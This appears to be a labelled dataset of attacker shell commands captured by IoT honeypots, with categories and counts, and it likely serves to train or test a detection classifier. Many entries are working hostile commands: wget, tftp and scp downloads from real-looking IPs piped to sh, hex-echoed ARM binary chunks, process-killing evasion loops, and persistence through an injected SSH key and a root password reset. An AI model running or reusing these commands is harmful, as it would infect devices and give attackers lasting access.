+{"command": "uname -s -v -n -r -m", "label": "reconnaissance", "count": 7105, "source": "real_round1"}
+{"command": "shell", "label": "reconnaissance", "count": 27737, "source": "real_round1"}
+{"command": "/bin/busybox echo > /var/run/.fxcat && sh /var/run/.fxcat && cd /var/run/", "label": "reconnaissance", "count": 381, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x00\\xa0\\xe3\\x01\\x10\\xa0\\xe3\\x04\\x20\\xa0\\xe1\\x62\\x29\\x00\\xeb\\x01\\x00\\x70\\xe3\\x00\\x50\\xa0\\xe1\\x00\\x00\\x86\\xe5\\x15\\x00\\x00\\x0a\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/./uname -s -v -n -r -m", "label": "reconnaissance", "count": 1388, "source": "real_round1"}
+{"command": "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x00\\xa0\\x03\\x60\\xfe\\xff\\x0a\\x08\\x00\\x9d\\xe5\\xf1\\x49\\x00\\xeb\\x00\\x30\\xa0\\xe3\\x03\\x00\\xa0\\xe1\\x60\\x30\\x8b\\xe5\\x5a\\xfe\\xff\\xea\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo WGET_CHECK", "label": "reconnaissance", "count": 9, "source": "real_round1"}
+{"command": "echo -ne \"\\x51\\x4b\\xf9\\xe7\\x3c\\x0e\\x40\\x4b\\xd9\\x87\\xb5\\xed\\xee\\x72\\x14\\x61\\x90\\xb8\\x1c\\x08\\x3d\\x57\\xb2\\x33\\xbe\\x63\\xb8\\x31\\xea\\xa4\\x01\\x49\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x49\\x1d\\x8d\\xe2\\x0a\\x00\\xa0\\xe1\\x10\\x10\\x81\\xe2\\x01\\x2c\\xa0\\xe3\\x86\\x3a\\x00\\xeb\\x00\\x50\\xa0\\xe3\\x05\\x60\\xa0\\xe1\\x05\\x80\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "sh", "label": "benign", "count": 27377, "source": "real_round1"}
+{"command": "echo -ne \"\\x0c\\x00\\x9d\\x05\\x50\\xff\\xff\\x0a\\xeb\\xff\\xff\\xea\\x00\\x30\\x95\\xe5\\x01\\x20\\xd3\\xe4\\x01\\xe0\\x4e\\xe2\\xff\\x20\\x02\\xe2\\x00\\x10\\xa0\\xe3\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x40\\xa0\\xe1\\x15\\x00\\x00\\x9a\\x14\\x00\\x8d\\xe2\\x00\\x70\\xa0\\xe3\\x00\\x10\\x91\\xe5\\x04\\x20\\xa0\\xe3\\x04\\x70\\x20\\xe5\\x1b\\x43\\x00\\xeb\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xc5\\xff\\xff\\xea\\x05\\x30\\xa0\\xe3\\x83\\x31\\xa0\\xe1\\x01\\x30\\x83\\xe0\\x0b\\x00\\xa0\\xe1\\x04\\x10\\xa0\\xe1\\x0f\\xe0\\xa0\\xe1\\x04\\xf0\\x93\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xd6\\x0c\\x70\\x6c\\x91\\x3c\\x1a\\xda\\x2d\\x04\\x46\\x2a\\x91\\x48\\x1c\\x61\\xf5\\x26\\xce\\x9a\\x19\\x52\\x7f\\xea\\x89\\xa6\\xf5\\x3a\\xc0\\x6b\\xd3\\x16\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x80\\x20\\x8f\\xe2\\x0c\\x00\\x92\\xe8\\xf8\\x31\\x00\\xeb\\xa0\\x3e\\xa0\\xe1\\xa1\\x4e\\xa0\\xe1\\x81\\x31\\x83\\xe1\\x04\\x60\\x21\\xe0\\x03\\x50\\x20\\xe0\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x48\\x50\\x8d\\xe5\\x10\\x20\\x89\\xe2\\x03\\x60\\xd2\\xe5\\x40\\x60\\x8d\\xe5\\x14\\x10\\x89\\xe2\\x18\\x00\\x89\\xe2\\x1c\\xc0\\x89\\xe2\\x20\\xe0\\x89\\xe2\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "linuxshell", "label": "reconnaissance", "count": 14233, "source": "real_round1"}
+{"command": "echo 1 && cat /bin/echoQtd#UPX!W'8", "label": "reconnaissance", "count": 3, "source": "real_round1"}
+{"command": "echo -ne \"\\x28\\x50\\x83\\xe5\\x2c\\x40\\xc3\\xe5\\x2d\\x10\\xc3\\xe5\\x06\\x00\\xa0\\xe3\\x55\\x35\\x00\\xeb\\x00\\x50\\x50\\xe2\\x0b\\x00\\x00\\x0a\\x05\\x40\\xa0\\xe3\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox UNSTABLE", "label": "reconnaissance", "count": 3288, "source": "real_round1"}
+{"command": "echo -ne \"\\x62\\xff\\xff\\xea\\x04\\x00\\xa0\\xe1\\x7c\\x10\\x9f\\xe5\\x13\\x20\\xa0\\xe3\\x4e\\x1a\\x00\\xeb\\x2f\\x7c\\xa0\\xe3\\x1b\\x8c\\xa0\\xe3\\x1b\\x40\\xa0\\xe3\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x03\\x00\\x51\\x31\\x01\\x12\\xa0\\x31\\x02\\x22\\xa0\\x31\\xfa\\xff\\xff\\x3a\\x02\\x01\\x51\\xe3\\x03\\x00\\x51\\x31\\x81\\x10\\xa0\\x31\\x82\\x20\\xa0\\x31\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x38\\xd3\\xff\\xeb\\x01\\x00\\x74\\xe3\\x16\\x00\\xa0\\xe3\\x00\\x10\\xa0\\xe3\\x10\\x80\\xbd\\x08\\xbd\\xd2\\xff\\xeb\\x05\\x20\\xa0\\xe3\\x00\\x10\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox hostname TOASTER", "label": "reconnaissance", "count": 166, "source": "real_round1"}
+{"command": "echo -ne \"\\x04\\x00\\x60\\xe0\\x00\\x30\\x82\\xe0\\x00\\x90\\xa0\\xe3\\x21\\x90\\x43\\xe5\\x0a\\x00\\xa0\\xe1\\x0b\\x10\\xa0\\xe1\\x63\\xff\\xff\\xeb\\x08\\x00\\x8a\\xe2\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x83\\x33\\x8c\\xe0\\x36\\x5e\\x83\\xe2\\x02\\x70\\xa0\\xe1\\x06\\x80\\xa0\\xe3\\x01\\x30\\x87\\xe2\\x01\\x04\\x50\\xe3\\x87\\x40\\xa0\\xe1\\x03\\x70\\x87\\xe0\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": ">/dev/shm/.andromedatest && cd /dev/shm/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x00\\xa0\\x11\\x64\\x00\\x00\\x0a\\x20\\x34\\xa0\\xe1\\xff\\x20\\x00\\xe2\\xff\\x30\\x03\\xe2\\x02\\x34\\x83\\xe1\\x43\\x14\\xa0\\xe1\\x02\\x30\\xc5\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in *\"/lib/\"*|*\"/lib64/\"*|*\".so\"*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done", "label": "defense_evasion", "count": 365, "source": "real_round1"}
+{"command": "ping; sh", "label": "reconnaissance", "count": 1029, "source": "real_round1"}
+{"command": "echo -ne \"\\xfa\\xff\\xff\\x3a\\x03\\x20\\x52\\xe2\\x0e\\x00\\x00\\xba\\x01\\x00\\x50\\xe1\\x01\\x00\\x40\\x20\\xa1\\x00\\x50\\xe1\\xa1\\x00\\x40\\x20\\x21\\x01\\x50\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x2c\\x78\\xdd\\xe5\\x2d\\x38\\xdd\\xe5\\x01\\xb4\\x92\\xe1\\x04\\x44\\x8e\\xe1\\x0c\\xa4\\x80\\xe1\\x06\\xe4\\x85\\xe1\\x03\\x14\\x87\\xe1\\x83\\x00\\x00\\x0a\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xcc\\x12\\x72\\x7b\\x40\\x73\\x9f\\x13\\x65\\xdf\\x5e\\x8b\\x33\\x81\\xc9\\xad\\x49\\x42\\xb0\\x0c\\x14\\xad\\xf0\\x31\\x40\\xfa\\x52\\x88\\x0c\\xf9\\x14\\xc3\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "echo -ne \"\\x0d\\x00\\x00\\xda\\x08\\x40\\xa0\\xe1\\x03\\x00\\x00\\xea\\x04\\x30\\x95\\xe5\\x01\\x40\\x84\\xe2\\x04\\x00\\x53\\xe1\\x07\\x00\\x00\\xda\\x00\\x30\\x95\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "cat /proc/mounts; /bin/busybox OUXLR", "label": "reconnaissance", "count": 1, "source": "real_round1"}
+{"command": ">/mnt/.andromedatest && cd /mnt/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": ">/etc/d && chmod 777 /etc/d && /etc/d && cd /etc/", "label": "reconnaissance", "count": 65, "source": "real_round1"}
+{"command": "cd /tmp||cd /var/run||cd /dev/shm||cd /root||cd /; wget -q http://196.251.121.142/install.sh -O k.sh; sh k.sh selfrep.telnet", "label": "malware_downloader", "count": 4, "source": "real_round1"}
+{"command": "echo -ne \"\\x01\\x70\\xd7\\xe5\\x00\\x41\\x9d\\xe5\\x03\\x20\\xd5\\xe5\\x02\\xa0\\xd4\\xe5\\x02\\xe0\\xd5\\xe5\\x01\\x40\\xd1\\xe5\\x01\\x50\\xd0\\xe5\\x01\\x60\\xd6\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x18\\x00\\x8b\\xe2\\x03\\x80\\xd0\\xe5\\x02\\xa0\\xd1\\xe5\\xc0\\x80\\x8d\\xe5\\x02\\x40\\xd0\\xe5\\xbc\\x40\\x8d\\xe5\\x1c\\xc0\\x8b\\xe2\\x03\\x50\\xdc\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xf2\\xff\\xff\\x8a\\x00\\x00\\x98\\xe5\\x00\\x00\\x50\\xe3\\xe9\\x18\\x00\\x1b\\x00\\x00\\xe0\\xe3\\x00\\x70\\x88\\xe5\\x04\\x70\\x88\\xe5\\x15\\xff\\xff\\xea\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x96\\xcc\\x5e\\xaf\\x6c\\x34\\x28\\x7d\\x52\\x97\\x9b\\xf5\\xe0\\x59\\x32\\x6b\\x49\\x9d\\xc4\\x65\\x9f\\x99\\x5c\\x33\\x3e\\x1e\\x6c\\x75\\x03\\xd8\\xf6\\x58\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0", "label": "benign", "count": 1, "source": "real_round1"}
+{"command": "/bin/busybox cp /bin/busybox .ffaaxx; >.ffaaxx; /bin/busybox chmod 777 .ffaaxx; /bin/busybox ANDROMEDA", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "/bin/busybox rm -rf .ffaaxx .meower", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": ">/var/.andromedatest && cd /var/", "label": "reconnaissance", "count": 12007, "source": "real_round1"}
+{"command": "echo -ne \"\\x2c\\x30\\x9d\\xe5\\x3c\\x80\\x8d\\xe2\\x00\\x80\\x8d\\xe5\\xd3\\xfa\\xff\\xeb\\x10\\x00\\x8d\\xe5\\x08\\xc0\\x9d\\xe5\\x04\\x10\\xa0\\xe3\\x0c\\x00\\x9c\\xe5\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done", "label": "defense_evasion", "count": 1825, "source": "real_round1"}
+{"command": "/bin/busybox echo > /tmp/.b && sh /tmp/.b && cd /tmp/", "label": "reconnaissance", "count": 241, "source": "real_round1"}
+{"command": "echo -ne \"\\xef\\xff\\xff\\x0a\\x21\\xed\\x8d\\xe2\\x00\\xc0\\xa0\\xe3\\x04\\xe0\\x8e\\xe2\\x40\\xc8\\x8d\\xe5\\x00\\xe0\\x8d\\xe5\\x44\\xa8\\x8d\\xe5\\x76\\x18\\x00\\xeb\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x00\\x30\\xe0\\xe3\\x00\\x30\\x85\\xe5\\x6c\\x60\\x85\\xe5\\x05\\x00\\xa0\\xe3\\x04\\x4a\\x00\\xeb\\xcd\\xff\\xff\\xea\\x05\\x00\\xa0\\xe1\\x01\\x20\\xa0\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "enable", "label": "reconnaissance", "count": 27570, "source": "real_round1"}
+{"command": "echo -ne \"\\x00\\x00\\x51\\xe3\\x2c\\x30\\x1b\\x15\\x03\\x38\\xa0\\x11\\x23\\x08\\xa0\\x11\\xd0\\x00\\x1b\\x05\\x30\\xc0\\x4b\\xe2\\xcc\\x10\\x4b\\xe2\\x0e\\x00\\x91\\xe8\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xa6\\x45\\xa0\\xe1\\x03\\x00\\x25\\xe0\\x04\\x10\\x26\\xe0\\x28\\x24\\x9f\\xe5\\x00\\x30\\xa0\\xe3\\xb5\\x40\\x00\\xeb\\xa0\\x38\\xa0\\xe1\\x81\\x37\\x83\\xe1\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x02\\x00\\xa0\\xe1\\x0d\\x10\\xa0\\xe1\\x4c\\x10\\x8d\\xe8\\xb1\\x49\\x00\\xeb\\x05\\x00\\xa0\\xe1\\x23\\x37\\x00\\xeb\\x7f\\x00\\xa0\\xe3\\xb8\\x40\\x00\\xeb\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\x21\\x28\\xb0\\xe1\\xfa\\xff\\xff\\x1a\\x01\\x40\\xe0\\xe1\\x14\\x30\\x9d\\xe5\\x50\\xc0\\x9d\\xe5\\x04\\x48\\xa0\\xe1\\x24\\x48\\xa0\\xe1\\x0c\\xe0\\x83\\xe0\" >> update.armv5l", "label": "malware_downloader", "count": 1, "source": "real_round1"}
+{"command": "echo -ne \"\\xa0\\x00\\xa0\\xe1\\x00\\x00\\x56\\xe1\\x8c\\xc0\\xa0\\xe1\\x06\\x60\\x60\\x20\\x01\\xc0\\x8c\\x23\\x04\\x00\\x52\\xe1\\xf0\\xff\\xff\\x1a\\x08\\x20\\x9d\\xe5\" >> update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round1"}
+{"command": "cd /tmp && pwd || cd /var/run && pwd || cd /dev/shm && pwd", "label": "benign", "count": 1, "source": "real_round2"}
+{"command": "busybox wget http://77.90.185.66/wget -O-", "label": "malware_downloader", "count": 64, "source": "real_round2"}
+{"command": ">/dev/.f && /bin/busybox chmod 777 /dev/.f && /dev/.f && cd /dev/; ", "label": "reconnaissance", "count": 25, "source": "real_round2"}
+{"command": "/bin/busybox hostname slur", "label": "reconnaissance", "count": 3, "source": "real_round2"}
+{"command": "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh", "label": "malware_downloader", "count": 28, "source": "real_round2"}
+{"command": "busybox tftp -g 185.93.89.72 -r tftp -l-", "label": "malware_downloader", "count": 42, "source": "real_round2"}
+{"command": "lghkel", "label": "benign", "count": 48, "source": "real_round2"}
+{"command": "cd ~; chattr -ia .ssh; lockr -ia .ssh", "label": "defense_evasion", "count": 159, "source": "real_round2"}
+{"command": ">/.codi && cd /", "label": "reconnaissance", "count": 56, "source": "real_round2"}
+{"command": ">/dev/shm/d && chmod 777 /dev/shm/d && /dev/shm/d && cd /dev/shm/", "label": "reconnaissance", "count": 65, "source": "real_round2"}
+{"command": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "label": "benign", "count": 4, "source": "real_round2"}
+{"command": "for proc_dir in /proc/*; do;     pid=${proc_dir##*/};     result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null);     if [ \"$result\" != \"${result%(deleted)}\" ]; then;         kill -9 \"$pid\";     fi; done", "label": "defense_evasion", "count": 70, "source": "real_round2"}
+{"command": "/bin/busybox tftp 45.150.195.235 -g -r tmips -l .a && /bin/busybox chmod 777 .a && ./.a telnet.tftp", "label": "malware_downloader", "count": 101, "source": "real_round2"}
+{"command": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh", "label": "malware_downloader", "count": 8, "source": "real_round2"}
+{"command": "chmod 777 update.sh 2>&1", "label": "malware_execution", "count": 4, "source": "real_round2"}
+{"command": "wget -O /dev/shm/bins.sh http://45.74.3.37:5001/bins.sh", "label": "malware_downloader", "count": 1, "source": "real_round2"}
+{"command": "/bin/busybox echo > /usr/.fxcat && sh /usr/.fxcat && cd /usr/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "wget http://91.199.133.133:8080/deploy.sh -O /tmp/.ds 2 > /dev/null", "label": "malware_downloader", "count": 6, "source": "real_round2"}
+{"command": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f", "label": "malware_downloader", "count": 42, "source": "real_round2"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/98.0", "label": "benign", "count": 1, "source": "real_round2"}
+{"command": "bah", "label": "benign", "count": 1, "source": "real_round2"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0", "label": "benign", "count": 1, "source": "real_round2"}
+{"command": "/bin/busybox MIORI", "label": "reconnaissance", "count": 8, "source": "real_round2"}
+{"command": "w", "label": "reconnaissance", "count": 7, "source": "real_round2"}
+{"command": "echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s", "label": "malware_downloader", "count": 174, "source": "real_round2"}
+{"command": "tftp -g 77.90.185.66 -r tftp -l-", "label": "malware_downloader", "count": 42, "source": "real_round2"}
+{"command": "cat /proc/mounts; /bin/busybox CPRIK", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "/bin/busybox echo > /var/tmp/.b && sh /var/tmp/.b && cd /var/tmp/", "label": "reconnaissance", "count": 241, "source": "real_round2"}
+{"command": "cd /proc && cat self/cmdline", "label": "reconnaissance", "count": 111, "source": "real_round2"}
+{"command": "cd /tmp && wget -q http://176.65.139.202:80/telnet.sh -O telnet.sh && chmod 777 telnet.sh && sh telnet.sh", "label": "malware_downloader", "count": 21, "source": "real_round2"}
+{"command": "wget http://176.65.139.202:80/daredevil.x86_64 -O /tmp/d.x86_64;chmod 777 /tmp/d.x86_64;/tmp/d.x86_64 selfrep", "label": "malware_downloader", "count": 3, "source": "real_round2"}
+{"command": ">/var/d && chmod 777 /var/d && /var/d && cd /var/", "label": "reconnaissance", "count": 65, "source": "real_round2"}
+{"command": ">/usr/.codi && cd /usr/", "label": "reconnaissance", "count": 56, "source": "real_round2"}
+{"command": "rm -rf .ffaaxx .d", "label": "reconnaissance", "count": 378, "source": "real_round2"}
+{"command": ">/etc/.codi && cd /etc/", "label": "reconnaissance", "count": 56, "source": "real_round2"}
+{"command": "./bot &", "label": "malware_execution", "count": 3, "source": "real_round2"}
+{"command": "echo \"root:VGlKmVMGDuKu\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "real_round2"}
+{"command": "echo -ne \"\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x54\\xae\\x00\\x00\\x34\\x00\\x00\\x00\" > update.XDarmv5l", "label": "malware_downloader", "count": 2, "source": "real_round2"}
+{"command": "ping ;sh", "label": "reconnaissance", "count": 589, "source": "real_round2"}
+{"command": "whoami", "label": "reconnaissance", "count": 6, "source": "real_round2"}
+{"command": "# Method 2: wget to stdout pipe (some old busybox)", "label": "benign", "count": 6, "source": "real_round2"}
+{"command": ">/var/tmp/.codi && cd /var/tmp/", "label": "reconnaissance", "count": 56, "source": "real_round2"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BMQVN", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "&k`g&k|zpkfq)ES[M", "label": "benign", "count": 91, "source": "real_round2"}
+{"command": "uname -s -m", "label": "reconnaissance", "count": 82, "source": "real_round2"}
+{"command": "wget -q http://176.65.132.8:4444/bot_64 -O bot_64", "label": "malware_downloader", "count": 20, "source": "real_round2"}
+{"command": "zalee", "label": "benign", "count": 91, "source": "real_round2"}
+{"command": "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh", "label": "malware_downloader", "count": 3, "source": "real_round2"}
+{"command": "cat /proc/mounts; /bin/busybox EBYVD", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "/bin/busybox echo > /mnt/.b && sh /mnt/.b && cd /mnt/", "label": "reconnaissance", "count": 241, "source": "real_round2"}
+{"command": "cat /proc/mounts; /bin/busybox UOVQO", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s", "label": "malware_downloader", "count": 174, "source": "real_round2"}
+{"command": "ls -l bot_64 2>/dev/null || echo '0'", "label": "reconnaissance", "count": 9, "source": "real_round2"}
+{"command": ">/mnt/.f && /bin/busybox chmod 777 /mnt/.f && /mnt/.f && cd /mnt/; ", "label": "reconnaissance", "count": 25, "source": "real_round2"}
+{"command": "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox sNoMf6yo ", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "wget --no-check-certificate -qO- https://217.60.195.113/sh", "label": "malware_downloader", "count": 6, "source": "real_round2"}
+{"command": "/bin/busybox echo > /dev/.b && sh /dev/.b && cd /dev/", "label": "reconnaissance", "count": 241, "source": "real_round2"}
+{"command": ">/mnt/d && chmod 777 /mnt/d && /mnt/d && cd /mnt/", "label": "reconnaissance", "count": 65, "source": "real_round2"}
+{"command": "/bin/busybox echo > /var/.b && sh /var/.b && cd /var/", "label": "reconnaissance", "count": 241, "source": "real_round2"}
+{"command": "top", "label": "reconnaissance", "count": 6, "source": "real_round2"}
+{"command": "/bin/busybox rm -rf condi72 thefuck", "label": "defense_evasion", "count": 56, "source": "real_round2"}
+{"command": "/bin/busybox IZ1H9", "label": "reconnaissance", "count": 7, "source": "real_round2"}
+{"command": "/bin/busybox echo > /home/.fxcat && sh /home/.fxcat && cd /home/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "echo 'rm -f .c $a' >> .s", "label": "malware_downloader", "count": 174, "source": "real_round2"}
+{"command": "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon", "label": "reconnaissance", "count": 31, "source": "real_round2"}
+{"command": "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "wget -qO- http://45.74.3.37:5001/bins.sh | sh", "label": "malware_downloader", "count": 3, "source": "real_round2"}
+{"command": "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in */lib/*|*/lib64/*|*.so*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done", "label": "defense_evasion", "count": 272, "source": "real_round2"}
+{"command": "/bin/busybox YAKUZA", "label": "reconnaissance", "count": 6, "source": "real_round2"}
+{"command": "sh .s; rm -f .s", "label": "malware_execution", "count": 174, "source": "real_round2"}
+{"command": "Contact: <sip:nm@nm>", "label": "benign", "count": 18, "source": "real_round2"}
+{"command": "echo STARTED", "label": "reconnaissance", "count": 3, "source": "real_round2"}
+{"command": "/bin/busybox V3G4", "label": "reconnaissance", "count": 9, "source": "real_round2"}
+{"command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~", "label": "persistence", "count": 159, "source": "real_round2"}
+{"command": "/bin/busybox TEST", "label": "reconnaissance", "count": 52, "source": "real_round2"}
+{"command": "echo OK", "label": "reconnaissance", "count": 244, "source": "real_round2"}
+{"command": ">/etc/.f && /bin/busybox chmod 777 /etc/.f && /etc/.f && cd /etc/; ", "label": "reconnaissance", "count": 25, "source": "real_round2"}
+{"command": "/bin/busybox echo > /etc/.fxcat && sh /etc/.fxcat && cd /etc/", "label": "reconnaissance", "count": 381, "source": "real_round2"}
+{"command": "tftp; wget; /bin/busybox VMTCF", "label": "reconnaissance", "count": 1, "source": "real_round2"}
+{"command": "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"", "label": "reconnaissance", "count": 31, "source": "real_round2"}
+{"command": "cat /proc/cpuinfo | grep name | wc -l", "label": "reconnaissance", "count": 6, "source": "real_round2"}
